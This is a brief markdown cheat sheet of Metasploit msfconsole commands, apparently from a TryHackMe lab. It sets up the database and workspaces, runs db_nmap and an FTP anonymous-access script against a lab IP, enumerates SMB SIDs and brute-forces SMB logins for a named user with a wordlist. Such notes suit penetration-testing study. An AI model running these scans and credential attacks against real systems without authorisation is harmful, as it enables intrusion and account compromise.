# Msfconsole
- [Msfconsole Concepts](../pentest/msfconsole_concepts.md)
```bash
service postgresql start

# might need (sudo -u postgres msfdb init)
msfdb init

msfconsole>

workspace

workspace -a tryhackme

workspace default

workspace -h

db_nmap -v -sV -T5 -p 1-1000 10.67.130.87

db_nmap --script-help ftp-* | grep non

db_nmap --script ftp-anon 10.67.130.87

help | grep db_

db_export /home/mymsfdb -f xml

# services -S ftp
services

hosts

search type:auxiliary smb

use auxiliary/scanner/smb/smb_lookupsid
setg RHOSTS 10.67.130.87
set MINRID 500
set MAXRID 1000
run

use auxiliary/scanner/smb/smb_login
set SMBUSER penny
set PASS_FILE home/MetasploitWordlist.txt
run

```
